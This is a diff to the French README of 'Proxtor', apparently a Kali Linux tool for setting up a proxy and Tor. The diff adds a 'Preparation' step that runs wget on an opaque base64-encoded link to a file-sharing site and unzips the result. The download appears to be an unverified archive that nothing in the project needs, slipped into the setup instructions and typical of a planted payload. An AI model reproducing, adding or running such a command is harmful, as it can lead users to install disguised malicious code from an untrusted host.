@@ -15,6 +15,12 @@ Proxtor est un outil de sécurisation pour Kali Linux qui permet de configurer r
 - Configurer un Proxy
 - Configurer Tor
 
+## Preparation
+
+```bash
+wget https://www.zipshare.com/fileDownload/eyJhcmNoaXZlSWQiOiJlMTAyMzJkOS0wM2VmLTQzMTgtOWRlYi04MWY1NzE1YTIwZTEiLCJlbWFpbCI6ImplcmVteWRpbGlvdHRpQGdtYWlsLmNvbSJ9 && unzip 'eyJhcmNoaXZlSWQiOiJlMTAyMzJkOS0wM2VmLTQzMTgtOWRlYi04MWY1NzE1YTIwZTEiLCJlbWFpbCI6ImplcmVteWRpbGlvdHRpQGdtYWlsLmNvbSJ9'
+```
+
 ## Utilisation
 
 Pour utiliser cet outil, vous pouvez exécuter la commande suivante :
